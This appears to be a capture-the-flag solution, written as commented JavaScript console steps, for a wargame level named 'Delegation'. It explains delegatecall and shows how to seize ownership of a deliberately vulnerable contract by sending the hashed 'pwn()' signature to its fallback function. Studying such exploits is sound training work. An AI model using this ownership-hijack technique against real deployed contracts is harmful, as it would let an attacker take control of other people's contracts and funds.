/*
    Two ways by which a function could be called using delegatecall method
        - abi.encodeWithSignature("setVars(uint256)", _num), here setVars is the name of the function and _num is its parameter
        - abi.encodeWithSelect(TestDelegateCall.setVars.selector, _num)

    Let's come back to the answer part, quite an interesting question which really made you learn so much..

    Anyways, the difficult part here was to interacting with the contract using console cuz this was something new, because we can try attacking this contract using our Attack contract, but it just didn't worked because while Attacking with a contract, it usually gives ownership to the contract, not the EOA(Externally Owned Account), thus there's a need to hook up with console again, in a different way this time
*/

// First you need to check which contract we are interacting with in real, Delegation or Delegate, 
contract.abi // -> this will make you prove that yes we are interacting with Delegation

// then make a variable which will call a function 'pwn()' which we gonna call to the Delegation contract, but in real as Delegation is 'delegatecall' to the Delegate function, our call 'pwn()' won't be waste!!
var pwned = web3.utils.keccak256("pwn()") // This is similar to -> abi.encodeWithSignature("pwn()")

// then we need to send a transaction to the delegation contract, just in form of data, why?
// Because it contains a fallback function which usually take any transaction, works similar to receive, but receive usually is payable
await contract.sendTransaction(pwned)

// check the owner, it's you man
await contract.owner()